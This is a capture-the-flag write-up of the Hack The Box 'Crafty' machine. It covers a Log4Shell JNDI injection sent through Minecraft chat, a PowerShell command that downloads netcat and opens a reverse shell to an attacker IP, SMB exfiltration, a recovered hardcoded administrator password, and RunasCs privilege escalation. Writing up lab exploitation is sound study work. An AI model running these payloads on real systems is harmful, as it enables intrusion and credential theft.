# HTB Write-Up: Crafty

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Crafty)     |
| Difficulty | Easy                                                           |
| OS         | Windows                                                        |
| Author     | Samurai                                                         |
| Date       | April 21, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Web Application & Minecraft Server](#2-enumeration--web-application--minecraft-server)
3. [Initial Access — Log4Shell via Minecraft (CVE-2021-44228)](#3-initial-access--log4shell-via-minecraft-cve-2021-44228)
4. [Lateral Movement — Plugin Reverse Engineering & Credential Recovery](#4-lateral-movement--plugin-reverse-engineering--credential-recovery)
5. [Privilege Escalation — RunasCs with Recovered Administrator Credentials](#5-privilege-escalation--runascs-with-recovered-administrator-credentials)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for rapid initial discovery:

```bash
rustscan -a 10.129.230.193 --ulimit 5000
```

**Open Ports:**

| Port  | Service   | Notes                                                         |
|-------|-----------|---------------------------------------------------------------|
| 80    | HTTP      | Web application — domain: `crafty.htb`                       |
| 25565 | Minecraft | Default Minecraft Java Edition server port — high interest    |

Port **25565** is the default Minecraft Java Edition server port. Its presence alongside a web application themed around a game server immediately indicates the Minecraft service is an attack surface and warrants direct testing.

---

## 2. Enumeration — Web Application & Minecraft Server

### 2.1 — Web Enumeration

The web application at `crafty.htb` was a static landing page for a Minecraft server. Subdomain and directory fuzzing was performed against both `crafty.htb` and `play.crafty.htb`:

```bash
# Subdomain fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u http://crafty.htb -H "Host: FUZZ.crafty.htb" -fs 140

# Directory fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
     -u http://crafty.htb/FUZZ
```

Neither scan produced actionable results beyond static site assets (`/css`, `/js`, `/img`) and a `/coming-soon` page. The web application offered no exploitable functionality. The page referenced `play.crafty.htb` as the Minecraft server address, reinforcing that port 25565 is the primary attack surface.

### 2.2 — Minecraft Server Identification

The Minecraft server on port 25565 was fingerprinted as running **Minecraft Java Edition version 1.16.5**. This version range is affected by **CVE-2021-44228 (Log4Shell)** — a critical remote code execution vulnerability in the Apache Log4j logging library that was widely embedded in Java applications, including Minecraft servers of this era.

To interact with the server, a compatible Minecraft Console Client was downloaded:

```bash
wget https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20231011-230/MinecraftClient-20231011-230-linux-x64
chmod +x MinecraftClient-20231011-230-linux-x64

# Test anonymous connection
./MinecraftClient-20231011-230-linux-x64 anything "" 10.129.230.193
```

Successful anonymous connection confirmed the server was reachable and accepting unauthenticated clients — and that in-game chat messages would be processed by the Log4j-instrumented server.

---

## 3. Initial Access — Log4Shell via Minecraft (CVE-2021-44228)

### 3.1 — Vulnerability Background

**Log4Shell (CVE-2021-44228)** is a critical zero-day vulnerability in Apache Log4j 2, disclosed in December 2021. The vulnerability exists in Log4j's message lookup feature: when user-controlled input containing a `${jndi:...}` expression is logged, Log4j performs a network lookup to the specified address. By pointing this lookup at an attacker-controlled LDAP server (via a **Rogue JNDI** server), arbitrary Java code can be delivered and executed on the target.

In the context of Minecraft, chat messages are logged by the server — making the in-game chat channel a direct injection point for the Log4Shell payload.

### 3.2 — Building the Rogue JNDI Server

A malicious LDAP server was built using the **rogue-jndi** tool, which serves a crafted Java object that executes an OS command upon deserialization:

```bash
git clone https://github.com/veracode-research/rogue-jndi.git
cd rogue-jndi
sudo apt install maven -y
mvn package
```

### 3.3 — Setting Up the Attack Infrastructure

Four coordinated terminals were used:

**Terminal 1 — HTTP server** (to serve `nc64.exe` to the target):
```bash
python3 -m http.server 80
```

**Terminal 2 — Reverse shell listener:**
```bash
rlwrap nc -nvlp 9001
```

**Terminal 3 — Rogue JNDI LDAP server** (delivers the payload; downloads and executes `nc64.exe`):
```bash
java -jar target/RogueJndi-1.1.jar \
  --command "powershell.exe iwr http://10.10.15.33/nc64.exe -O c:\windows\temp\nc64.exe; c:\windows\temp\nc64.exe 10.10.15.33 9001 -e cmd.exe" \
  --hostname "10.10.15.33"
```

**Terminal 4 — Minecraft Console Client** (injects the Log4Shell payload via chat):
```bash
./MinecraftClient-20231011-230-linux-x64 hello "" 10.129.230.193
# In the client:
<hello> ${jndi:ldap://10.10.15.33:1389/o=reference}
```

### 3.4 — Shell Obtained

When the chat message containing the JNDI lookup was sent, the Minecraft server's Log4j instance resolved the attacker's LDAP server, received the malicious Java object, and executed the embedded PowerShell command — downloading and running `nc64.exe`.

**Result — Shell obtained as `svc_minecraft`:**

```
connect to [10.10.15.33] from (UNKNOWN) [10.129.230.193] 49685
Microsoft Windows [Version 10.0.17763.5329]
C:\users\svc_minecraft\server>
```

**User flag retrieved from `C:\users\svc_minecraft\Desktop\user.txt`.**

---

## 4. Lateral Movement — Plugin Reverse Engineering & Credential Recovery

### 4.1 — Identifying the Plugin

Post-exploitation enumeration of the Minecraft server directory revealed a custom plugin in the `plugins` folder:

```
C:\users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
```

Custom plugins are a common source of hardcoded credentials in Minecraft-themed CTF challenges and real-world assessments. The JAR file was exfiltrated to the attacker machine for decompilation.

### 4.2 — Exfiltrating the JAR via SMB

An SMB share was stood up on the attacker machine using **impacket-smbserver**:

```bash
impacket-smbserver -smb2support temp temp -username admin -password admin
```

The plugin JAR was then copied from the target to the share:

```powershell
net use \\10.10.15.33\temp /user:admin admin
copy playercounter-1.0-SNAPSHOT.jar \\10.10.15.33\temp\playercounter-1.0-SNAPSHOT.jar
```

### 4.3 — Decompiling and Extracting Credentials

The JAR was decompiled using an online Java decompiler. Inspection of `playercounter/Playercounter.java` revealed a hardcoded password embedded directly in the plugin's source code:

```
Password: s67u84zKq8IXw
```

This credential belonged to the `administrator` account.

---

## 5. Privilege Escalation — RunasCs with Recovered Administrator Credentials

### 5.1 — Approach

The recovered Administrator password could not be used directly via `su` or WinRM from the current shell context. **RunasCs** — a Windows utility that executes processes under a different user's credentials without requiring an interactive logon session — was used to spawn a reverse shell as Administrator.

### 5.2 — Preparing the Payload

A batch script was created to deliver the reverse shell:

```bat
@echo on
c:\windows\temp\nc64.exe 10.10.15.33 9002 -e cmd.exe
```

A second listener was opened on port 9002:

```bash
rlwrap nc -nvlp 9002
```

### 5.3 — Transferring and Executing RunasCs

`RunasCs.exe` and `shell.bat` were transferred to the target via `curl` from the attacker's HTTP server:

```powershell
curl 10.10.15.33/RunasCs.exe -O C:\Temp\RunasCs.exe
curl 10.10.15.33/shell.bat -O C:\Temp\shell.bat
```

RunasCs was then executed with the recovered credentials, specifying logon type 2 (interactive) to ensure the Administrator token was fully applied:

```powershell
.\RunasCs.exe -l 2 administrator s67u84zKq8IXw "c:\temp\shell.bat"
```

**Result — Administrator shell obtained:**

```
connect to [10.10.15.33] from (UNKNOWN) [10.129.230.193] 49711
C:\Windows\system32> whoami
crafty\administrator
```

**Root flag retrieved from `C:\Users\Administrator\Desktop\root.txt`.**

---

## 6. Summary

| Phase                   | Technique                                                              | Result                              |
|-------------------------|------------------------------------------------------------------------|-------------------------------------|
| Recon                   | RustScan                                                               | Ports 80 and 25565 identified       |
| Enumeration             | ffuf — subdomain and directory fuzzing; Minecraft client connection    | Port 25565 confirmed as Log4j target|
| Initial Access          | CVE-2021-44228 (Log4Shell) via Minecraft chat + Rogue JNDI server     | Shell as `svc_minecraft`            |
| Credential Recovery     | Plugin JAR exfiltrated via SMB → decompiled → hardcoded password found| Administrator password recovered    |
| Privilege Escalation    | RunasCs with Administrator credentials → reverse shell                 | Shell as `crafty\administrator`     |

### Key Takeaways

- **Log4Shell remains a critical risk on unpatched Java applications.** CVE-2021-44228 affected virtually every Java application using Log4j 2.x prior to version 2.15.0. Any user-controlled input that reaches a logging call is a potential injection point — in this case, the Minecraft chat channel. Patching Log4j and auditing all Java dependencies is essential.
- **Custom plugins and internal tooling are a common source of hardcoded credentials.** Developer-written plugins rarely undergo the same security review as production code. Any JAR, DLL, or executable deployed in a service context should be inspected for embedded secrets before deployment.
- **Credentials stored in application code grant lateral movement even without direct service exposure.** The Administrator password was only accessible through reverse engineering a plugin — not through any exposed interface. Defense-in-depth requires treating all application artifacts as potentially sensitive.
- **RunasCs is a powerful post-exploitation tool on Windows when credentials are known but direct access is restricted.** It bypasses the need for an interactive session or WinRM access, making it effective in constrained shell environments. Monitoring for unusual `runas`-style process creation events is an important detection signal.
